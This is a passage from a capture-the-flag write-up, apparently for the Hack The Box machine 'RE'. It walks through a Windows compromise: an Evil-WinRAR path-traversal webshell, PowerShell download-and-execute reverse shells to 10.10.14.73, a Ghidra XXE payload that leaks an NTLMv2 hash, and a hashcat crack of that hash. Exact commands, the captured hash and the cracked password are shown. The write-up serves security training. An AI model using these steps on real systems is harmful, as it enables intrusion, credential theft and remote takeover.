</span></span></span><span style=display:flex><span><span style=color:#6272a4>	  &lt;li&gt; Upload zip here:&lt;/li&gt;
</span></span></span><span style=display:flex><span><span style=color:#6272a4>    &lt;/ol&gt; --&gt;</span>
</span></span><span style=display:flex><span>  &lt;/<span style=color:#ff79c6>body</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#ff79c6>html</span>&gt;
</span></span></code></pre></div><p>From here, strategy would be to try to upload a file in this web application root folder to escalate to IIS privileges.
We know the execution process except upfront a RAR file, so if we are successful to exploit a directory traversal,
maybe we can uncompress a ASP.NET webshell outside of the current directory into the web root folder.</p><h1 id=searching-for-further-vulnerabilities>Searching for further vulnerabilities</h1><p>We want to upload winPEAS.bat but we are not successful, but we are not successful with the command:</p><pre tabindex=0><code>iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.73:8080/shell.ps1&#39;)
</code></pre><p>Instead we can use any alternative such as <code>wget -o winPEAS.bat http://10.10.14.73:8080/winPEAS.bat</code> or the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\U</span>sers<span style=color:#f1fa8c>\L</span>uke<span style=color:#f1fa8c>\D</span>esktop&gt; Invoke-RestMethod -Uri http://10.10.14.73:8080/winPEAS.bat -Method Get &gt; winPEAS.bat
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\U</span>sers<span style=color:#f1fa8c>\L</span>uke<span style=color:#f1fa8c>\D</span>esktop&gt; <span style=color:#8be9fd;font-style:italic>type</span> winPEAS.bat
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\U</span>sers<span style=color:#f1fa8c>\L</span>uke<span style=color:#f1fa8c>\D</span>esktop&gt; winPEAS.bat
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\U</span>sers<span style=color:#f1fa8c>\L</span>uke<span style=color:#f1fa8c>\M</span>usic&gt; cmd /c winPEAS.bat
</span></span></code></pre></div><p>We get a lot of useful information such as:</p><ul><li>softwares: Notepad++ PeaZip Sysinternals WinRAR WinRAR1</li><li>admins:Administrator coby</li><li>remote users: coby</li><li>users: cam luke</li></ul><p>We probably want to escalate to user coby as he is admin</p><p>We also have DPAPI information which is useful for Mimikatz exploitation of EFS:
see <a href=https://ippsec.rocks/>Using Mimikatz to decrypt the EFS Protected file with Tolu&rsquo;s password</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>PRIVILEGES INFORMATION
</span></span><span style=display:flex><span>----------------------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Privilege Name                Description                    <span style=color:#8be9fd;font-style:italic>State</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>=============================</span> <span style=color:#ff79c6>==============================</span> <span style=color:#ff79c6>========</span>
</span></span><span style=display:flex><span>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
</span></span><span style=display:flex><span>SeIncreaseWorkingSetPrivilege Increase a process working <span style=color:#8be9fd;font-style:italic>set</span> Disabled
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-&gt; <span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> DPAPI MASTER KEYS &lt;_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>i<span style=color:#ff79c6>]</span> Use the Mimikatz <span style=color:#f1fa8c>&#39;dpapi::masterkey&#39;</span> module with appropriate arguments <span style=color:#ff79c6>(</span>/rpc<span style=color:#ff79c6>)</span> to decrypt
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>[</span>?<span style=color:#ff79c6>]</span> https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Directory: C:<span style=color:#f1fa8c>\U</span>sers<span style=color:#f1fa8c>\l</span>uke<span style=color:#f1fa8c>\A</span>ppData<span style=color:#f1fa8c>\R</span>oaming<span style=color:#f1fa8c>\M</span>icrosoft<span style=color:#f1fa8c>\P</span>rotect
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name
</span></span><span style=display:flex><span>----                -------------         ------ ----
</span></span><span style=display:flex><span>d---s-        3/13/2019   6:45 PM                S-1-5-21-311800348-2366743891-1978325779-1001
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-&gt; <span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> DPAPI MASTER KEYS &lt;_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>i<span style=color:#ff79c6>]</span> Use the Mimikatz <span style=color:#f1fa8c>&#39;dpapi::cred&#39;</span> module with appropriate /masterkey to decrypt
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>i<span style=color:#ff79c6>]</span> You can also extract many DPAPI masterkeys from memory with the Mimikatz <span style=color:#f1fa8c>&#39;sekurlsa::dpapi&#39;</span> module
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>[</span>?<span style=color:#ff79c6>]</span> https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
</span></span><span style=display:flex><span>Looking inside C:<span style=color:#f1fa8c>\U</span>sers<span style=color:#f1fa8c>\l</span>uke<span style=color:#f1fa8c>\A</span>ppData<span style=color:#f1fa8c>\R</span>oaming<span style=color:#f1fa8c>\M</span>icrosoft<span style=color:#f1fa8c>\C</span>redentials<span style=color:#f1fa8c>\
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c></span>Looking inside C:<span style=color:#f1fa8c>\U</span>sers<span style=color:#f1fa8c>\l</span>uke<span style=color:#f1fa8c>\A</span>ppData<span style=color:#f1fa8c>\L</span>ocal<span style=color:#f1fa8c>\M</span>icrosoft<span style=color:#f1fa8c>\C</span>redentials<span style=color:#f1fa8c>\
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c></span>DFBE70A7E5CC19A398EBF1B96859CE5D
</span></span></code></pre></div><p>We can clone evil-WinRAR-Gen, PayloadAllTheThing and TENNC git repos.</p><ul><li>[PayloadAllTheThings](git clone <a href=https://github.com/swisskyrepo/PayloadsAllTheThings.git>https://github.com/swisskyrepo/PayloadsAllTheThings.git</a>) - the shell.asp did not work for us</li><li><a href=https://github.com/manulqwerty/Evil-WinRAR-Gen>Evil-WinRAR-Gen</a></li><li><a href=https://github.com/tennc/webshell.git>TENNC collection of shells</a></li></ul><p>We can use evil-winrar to write a reverse shell in IIS server:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>find /opt/tennc | grep antak
</span></span><span style=display:flex><span>python evilWinRAR.py -o ~/htb/evil-winrar/shell.rar -e ~/htb/evil-winrar/antak.aspx -g ~/htb/evil-winrar/good.txt -p <span style=color:#f1fa8c>&#39;C:\inetpub\wwwroot\ip\&#39;</span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#we put a &#39;\&#39; caracter at the end of the path because it is required. We could audit this requirement with:</span>
</span></span><span style=display:flex><span>xxd -c <span style=color:#bd93f9>32</span> &lt;RAR_FILE&gt;
</span></span><span style=display:flex><span>mv ~/htp/evil-winrar/shell.rar ~/htb/http/
</span></span></code></pre></div><p>We can now go in Luke ods folder and fetch the rar file with the command: <code>wget -o shell.rar http://10.10.14.73:8080/shell.rar</code>.
The RAR is automatically uncompressed by the process_sample.ps1 file, and we can verify we have an effective webshell on our browser <code>http://ip.htb/antak.aspx</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>PS&gt; whoami
</span></span><span style=display:flex><span>iis apppool<span style=color:#f1fa8c>\i</span>p
</span></span></code></pre></div><p>We prepare a new TCP reverse Shell that listens on port 8001.
Then, we use our new antak.aspx webshell to get a command-line <code>iex(new-object net.webclient).downloadstring('http://10.10.14.73:8080/iis.ps1')</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ctf@6274ae97a895:/$ cp ~/htp/http/shell.ps1 ~/htb/http/iis.ps1
</span></span><span style=display:flex><span>ctf@6274ae97a895:/$ vi ~/htb/http/iis.ps1
</span></span><span style=display:flex><span>ctf@6274ae97a895:/$ rlwrap nc -lnvp <span style=color:#bd93f9>8001</span>
</span></span><span style=display:flex><span>listening on <span style=color:#ff79c6>[</span>any<span style=color:#ff79c6>]</span> <span style=color:#bd93f9>8001</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#ff79c6>[</span>172.17.0.2<span style=color:#ff79c6>]</span> from <span style=color:#ff79c6>(</span>UNKNOWN<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>[</span>192.168.99.1<span style=color:#ff79c6>]</span> <span style=color:#bd93f9>64563</span>
</span></span><span style=display:flex><span>Windows PowerShell running as user RE$ on RE
</span></span><span style=display:flex><span>Copyright <span style=color:#ff79c6>(</span>C<span style=color:#ff79c6>)</span> <span style=color:#bd93f9>2015</span> Microsoft Corporation. All rights reserved.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\w</span>indows<span style=color:#f1fa8c>\s</span>ystem32<span style=color:#f1fa8c>\i</span>netsrv&gt;whoami
</span></span><span style=display:flex><span>iis apppool<span style=color:#f1fa8c>\i</span>p
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\w</span>indows<span style=color:#f1fa8c>\s</span>ystem32<span style=color:#f1fa8c>\i</span>netsrv&gt;
</span></span></code></pre></div><p>We can then &lsquo;cd C:\proj_drop', but we don&rsquo;t have read/write access &mldr;
we therefore repeat the operation to generate an evil Rar document,
but we change the path to point to the &lsquo;C:\inetpub\wwwroot\re' folder.
This time we connect our browser to <code>http://ip.htb/antak.aspx</code>,
then type:<code>iex(new-object net.webclient).downloadstring('http://10.10.14.73:8080/iis.ps1')</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\w</span>indows<span style=color:#f1fa8c>\s</span>ystem32<span style=color:#f1fa8c>\i</span>netsrv&gt;whoami
</span></span><span style=display:flex><span>iis apppool<span style=color:#f1fa8c>\r</span>e
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\w</span>indows<span style=color:#f1fa8c>\s</span>ystem32<span style=color:#f1fa8c>\i</span>netsrv&gt;
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\w</span>indows<span style=color:#f1fa8c>\s</span>ystem32<span style=color:#f1fa8c>\i</span>netsrv&gt; <span style=color:#8be9fd;font-style:italic>cd</span> <span style=color:#f1fa8c>\
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c></span>PS C:<span style=color:#f1fa8c>\&gt;</span> <span style=color:#8be9fd;font-style:italic>cd</span> proj_drop
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\p</span>roj_drop&gt; ls
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\p</span>roj_drop&gt; <span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#39;test&#39;</span> &gt; <span style=color:#8be9fd;font-style:italic>test</span>
</span></span></code></pre></div><p>We can now attempt to exploit this ghidra RCE by crafting a ghidra project.
A better description of the issue is available here <a href=https://github.com/NationalSecurityAgency/ghidra/issues/71>Ghidra XXE exploit</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>brew cask install ghidra
</span></span><span style=display:flex><span>ghidraRun
</span></span><span style=display:flex><span>cat xxe.rep/project.prp
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#ff79c6>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;FILE_INFO&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;BASIC_INFO&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;STATE</span> <span style=color:#50fa7b>NAME=</span><span style=color:#f1fa8c>&#34;OWNER&#34;</span> <span style=color:#50fa7b>TYPE=</span><span style=color:#f1fa8c>&#34;string&#34;</span> <span style=color:#50fa7b>VALUE=</span><span style=color:#f1fa8c>&#34;username&#34;</span> <span style=color:#ff79c6>/&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;/BASIC_INFO&gt;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;/FILE_INFO&gt;</span>
</span></span></code></pre></div><p>We edit the file to make our exploit</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#ff79c6>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;!DOCTYPE aaa [
</span></span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;!ENTITY % dtd SYSTEM &#34;//10.10.14.73/i&#34;&gt;</span>
</span></span><span style=display:flex><span>%dtd;
</span></span><span style=display:flex><span>]&gt;
</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;FILE_INFO&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;BASIC_INFO&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;STATE</span> <span style=color:#50fa7b>NAME=</span><span style=color:#f1fa8c>&#34;OWNER&#34;</span> <span style=color:#50fa7b>TYPE=</span><span style=color:#f1fa8c>&#34;string&#34;</span> <span style=color:#50fa7b>VALUE=</span><span style=color:#f1fa8c>&#34;i&#34;</span> <span style=color:#ff79c6>/&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;/BASIC_INFO&gt;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;/FILE_INFO&gt;</span>
</span></span></code></pre></div><p>We create a zip project archive as indicated by the Ghidra post: <code>zip -r ../ghidra_xxe_smb_fs.zip ./*</code> and we place it inside our python webserver</p><p>If we run <code>PS C:\proj_drop> wget -o g.zip http://10.10.14.73:8080/ghidra_xxe_smb_fs.zip</code>,
Responder will give us coby password hash.
Note that this will work as well if we change the string with backward slash: &ldquo;\10.10.14.73\i&rdquo; or &ldquo;\\10.10.14.73\i&rdquo;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> Listening <span style=color:#ff79c6>for</span> events...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>SMB<span style=color:#ff79c6>]</span> NTLMv2-SSP Client   : 10.10.10.144
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>SMB<span style=color:#ff79c6>]</span> NTLMv2-SSP Username : RE<span style=color:#f1fa8c>\c</span>oby
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>SMB<span style=color:#ff79c6>]</span> NTLMv2-SSP Hash     : coby::RE:b1abcf60d6d97be7:8C6F4BD258951C9B6DE62C9F867BB44D:0101000000000000C0653150DE09D201EA31965E873AF1AE000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000A937185F9D8BE12DC1461140265EB6CA543BFBFE1765CEFB7733FCC5D6BF30D40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0037003300000000000000000000000000
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Skipping previously captured <span style=color:#8be9fd;font-style:italic>hash</span> <span style=color:#ff79c6>for</span> RE<span style=color:#f1fa8c>\c</span>oby
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Skipping previously captured <span style=color:#8be9fd;font-style:italic>hash</span> <span style=color:#ff79c6>for</span> RE<span style=color:#f1fa8c>\c</span>oby
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Skipping previously captured <span style=color:#8be9fd;font-style:italic>hash</span> <span style=color:#ff79c6>for</span> RE<span style=color:#f1fa8c>\c</span>oby
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>FTP<span style=color:#ff79c6>]</span> Cleartext Client   : 10.10.10.144
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>FTP<span style=color:#ff79c6>]</span> Cleartext Username : anonymous
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>FTP<span style=color:#ff79c6>]</span> Cleartext Password : Java11.0.2@
</span></span></code></pre></div><p>We can also change our payload to &ldquo;http://10.10.14.73:8002/i&rdquo;, to observe a HTTP get request on port 8002</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ctf@6274ae97a895:/$ rlwrap nc -lnvp <span style=color:#bd93f9>8002</span>
</span></span><span style=display:flex><span>listening on <span style=color:#ff79c6>[</span>any<span style=color:#ff79c6>]</span> <span style=color:#bd93f9>8002</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#ff79c6>[</span>172.17.0.2<span style=color:#ff79c6>]</span> from <span style=color:#ff79c6>(</span>UNKNOWN<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>[</span>192.168.99.1<span style=color:#ff79c6>]</span> <span style=color:#bd93f9>64827</span>
</span></span><span style=display:flex><span>GET /i HTTP/1.1
</span></span><span style=display:flex><span>User-Agent: Java/11.0.2
</span></span><span style=display:flex><span>Host: 10.10.14.73:8002
</span></span><span style=display:flex><span>Accept: text/html, image/gif, image/jpeg, *; <span style=color:#8be9fd;font-style:italic>q</span><span style=color:#ff79c6>=</span>.2, */*; <span style=color:#8be9fd;font-style:italic>q</span><span style=color:#ff79c6>=</span>.2
</span></span><span style=display:flex><span>Connection: keep-alive
</span></span></code></pre></div><p>We wget <a href=https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt>rockyou.txt</a> dictionary to recover coby password:
We use hashcat against rockyou</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>hashcat --force -m <span style=color:#bd93f9>5600</span> re.ntlmv2  /opt/dictionaries/rockyou.txt
</span></span><span style=display:flex><span>COBY::RE:b1abcf60d6d97be7:8c6f4bd258951c9b6de62c9f867bb44d:0101000000000000c0653150de09d201ea31965e873af1ae000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000a937185f9d8be12dc1461140265eb6ca543bfbfe1765cefb7733fcc5d6bf30d40a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0037003300000000000000000000000000:championship2005
</span></span></code></pre></div><p>We can try to connect with python3-impacket but user coby is not authorized SVCManager.</p><p>So we have to login as coby from an already opened Powershell session by creating a SecureString shell connection:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\p</span>roj_drop&gt; <span style=color:#8be9fd;font-style:italic>$pass</span> <span style=color:#ff79c6>=</span> convertto-securestring <span style=color:#f1fa8c>&#39;championship2005&#39;</span> -asplain -force
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\p</span>roj_drop&gt; <span style=color:#8be9fd;font-style:italic>$pass</span>
</span></span><span style=display:flex><span>System.Security.SecureString
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\p</span>roj_drop&gt; <span style=color:#8be9fd;font-style:italic>$cred</span> <span style=color:#ff79c6>=</span> new-object system.management.automation.pscredential<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;.\coby&#39;</span>, <span style=color:#8be9fd;font-style:italic>$pass</span><span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\p</span>roj_drop&gt; <span style=color:#8be9fd;font-style:italic>$cred</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>UserName                     Password
</span></span><span style=display:flex><span>--------                     --------
</span></span><span style=display:flex><span>.<span style=color:#f1fa8c>\c</span>oby   System.Security.SecureString
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\p</span>roj_drop&gt; invoke-command -computer re -credential <span style=color:#8be9fd;font-style:italic>$cred</span> -scriptblock <span style=color:#ff79c6>{</span>IEX<span style=color:#ff79c6>(</span>new-object net.webclient<span style=color:#ff79c6>)</span>.downloadstring<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;http://10.10.14.73:8080/iis.ps1&#39;</span><span style=color:#ff79c6>)}</span>
</span></span></code></pre></div><p>And we get a shell</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ctf@6274ae97a895:/$ nc -lnvp <span style=color:#bd93f9>8001</span>
</span></span><span style=display:flex><span>listening on <span style=color:#ff79c6>[</span>any<span style=color:#ff79c6>]</span> <span style=color:#bd93f9>8001</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#ff79c6>[</span>172.17.0.2<span style=color:#ff79c6>]</span> from <span style=color:#ff79c6>(</span>UNKNOWN<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>[</span>192.168.99.1<span style=color:#ff79c6>]</span> <span style=color:#bd93f9>65227</span>
</span></span><span style=display:flex><span>Windows PowerShell running as user coby on RE
</span></span><span style=display:flex><span>Copyright <span style=color:#ff79c6>(</span>C<span style=color:#ff79c6>)</span> <span style=color:#bd93f9>2015</span> Microsoft Corporation. All rights reserved.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\U</span>sers<span style=color:#f1fa8c>\c</span>oby<span style=color:#f1fa8c>\D</span>ocuments&gt; whoami
</span></span><span style=display:flex><span>re<span style=color:#f1fa8c>\c</span>oby
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\U</span>sers<span style=color:#f1fa8c>\c</span>oby<span style=color:#f1fa8c>\D</span>ocuments&gt; <span style=color:#8be9fd;font-style:italic>type</span> process_projects.ps1
</span></span></code></pre></div><p>We can now observe the source code of script launching ghidra:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$dropbox</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;C:\proj_drop&#34;</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$proj_dir</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;C:\users\coby\ghidra_projects\import&#34;</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$ghidra_bat</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;C:\users\coby\ghidra_9.0\ghidraRun.bat&#34;</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$ghidra_config</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;C:\Users\coby\.ghidra\.ghidra-9.0\preferences&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>while</span> <span style=color:#ff79c6>(</span><span style=color:#8be9fd;font-style:italic>$true</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        Get-ChildItem <span style=color:#8be9fd;font-style:italic>$dropbox</span> | ForEach-Object <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span><span style=color:#8be9fd;font-style:italic>$_</span>.Extension -eq <span style=color:#f1fa8c>&#34;.zip&#34;</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            Remove-Item <span style=color:#8be9fd;font-style:italic>$proj_dir</span><span style=color:#f1fa8c>\*</span> -Recurse -Force
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            Expand-Archive -LiteralPath <span style=color:#8be9fd;font-style:italic>$_</span>.fullname -DestinationPath <span style=color:#8be9fd;font-style:italic>$proj_dir</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    <span style=color:#6272a4># get project name</span>
</span></span><span style=display:flex><span>                    Get-ChildItem -Path <span style=color:#8be9fd;font-style:italic>$proj_dir</span> -filter *.rep | ForEach-Object <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>                                <span style=color:#8be9fd;font-style:italic>$proj_name</span> <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>$_</span>.name -replace <span style=color:#f1fa8c>&#34;.rep&#34;</span>,<span style=color:#f1fa8c>&#34;&#34;</span>
</span></span><span style=display:flex><span>                                <span style=color:#8be9fd;font-style:italic>$last_open</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;LastOpenedProject=</span><span style=color:#8be9fd;font-style:italic>$proj_dir</span><span style=color:#f1fa8c>\$proj_name&#34;</span>
</span></span><span style=display:flex><span>                <span style=color:#8be9fd;font-style:italic>$proj_prp</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;{0}\{1}.rep\project.prp&#39;</span> -f <span style=color:#8be9fd;font-style:italic>$proj_dir</span>, <span style=color:#8be9fd;font-style:italic>$proj_name</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span><span style=color:#ff79c6>([</span>System.IO.File<span style=color:#ff79c6>]</span>::Exists<span style=color:#ff79c6>(</span><span style=color:#8be9fd;font-style:italic>$proj_prp</span><span style=color:#ff79c6>))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                            <span style=color:#6272a4>#replace name in $ghidra config</span>
</span></span><span style=display:flex><span>                            Get-Content <span style=color:#8be9fd;font-style:italic>$ghidra_config</span> | findstr /v LastOpenedProject | Set-Content <span style=color:#8be9fd;font-style:italic>$ghidra_config</span>
</span></span><span style=display:flex><span>                            <span style=color:#ff79c6>(</span><span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#8be9fd;font-style:italic>$last_open</span><span style=color:#ff79c6>)</span> -replace <span style=color:#f1fa8c>&#34;\\&#34;</span>,<span style=color:#f1fa8c>&#34;\\&#34;</span> | Out-File -encoding ASCII -append <span style=color:#8be9fd;font-style:italic>$ghidra_config</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                                        <span style=color:#6272a4># run project</span>
</span></span><span style=display:flex><span>                            <span style=color:#8be9fd;font-style:italic>$ghidra</span> <span style=color:#ff79c6>=</span> Start-Process -passthru <span style=color:#8be9fd;font-style:italic>$ghidra_bat</span>
</span></span><span style=display:flex><span>                            Start-Sleep <span style=color:#bd93f9>50</span>
</span></span><span style=display:flex><span>                            stop-process -force -name javaw
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                Remove-Item -Path <span style=color:#8be9fd;font-style:italic>$_</span>.fullname
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Start-Sleep <span style=color:#bd93f9>2</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>We can now get the root flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>PS </span>C:\Users\coby&gt; <span style=color:#8be9fd;font-style:italic>cd </span>\Users
